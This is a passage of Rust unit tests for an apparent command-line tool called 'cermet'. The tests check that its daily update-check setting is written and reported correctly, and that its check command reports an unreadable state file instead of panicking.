    /// The knob is `cermet update --daily on|off`: it writes the operator's own file, prints the
    /// state that resulted, and names the command that flips it back.
    #[test]
    fn the_daily_knob_writes_the_setting_and_prints_what_resulted() {
        let dir = temp();
        let path = dir.path().join("cermet").join("config.toml");

        let out = run_daily_setting(&path, false).expect("off");
        assert!(out.ok);
        assert!(
            out.text.contains("daily update check: disabled"),
            "{}",
            out.text
        );
        assert!(
            out.text.contains("cermet update --daily on"),
            "{}",
            out.text
        );
        assert!(!crate::settings::read_update_check(&path).expect("read back"));

        let out = run_daily_setting(&path, true).expect("on");
        assert!(
            out.text.contains("daily update check: enabled"),
            "{}",
            out.text
        );
        assert!(
            out.text.contains("installs nothing"),
            "the enabled state says what it does NOT do: {}",
            out.text
        );
        assert!(crate::settings::read_update_check(&path).expect("read back"));
    }

    /// `cermet check` reads the same two files and never guesses around one it cannot read.
    #[test]
    fn the_check_report_reads_the_setting_and_the_state_and_reports_what_it_cannot() {
        let dir = temp();
        let config = dir.path().join("config.toml");
        let empty = UpdateCheckReport::read(&config);
        assert!(empty.enabled, "the default is on");
        assert!(empty.state.is_none() && empty.problem.is_none());

        crate::settings::write_update_check(&config, false).expect("off");
        write_state(
            &state_dir(&config),
            &UpdateState {
                checked_at: "2026-08-17T04:17:00Z".to_string(),
                running: "0.1.0".to_string(),
                available: Some("0.1.1".to_string()),
                verification: Some(Verification::GithubRelease),
                ..Default::default()
            },
        )
        .expect("write");
        let report = UpdateCheckReport::read(&config);
        assert!(!report.enabled);
        assert_eq!(
            report.state.as_ref().unwrap().available.as_deref(),
            Some("0.1.1")
        );
        assert!(report.problem.is_none());

        // A state file that does not parse is a FINDING, not a panic and not a silent "no state".
        std::fs::write(state_dir(&config).join("state.json"), "{not json").expect("write");
        let broken = UpdateCheckReport::read(&config);
        assert!(broken.state.is_none());
        assert!(broken.problem.is_some(), "an unreadable state is reported");
    }
}
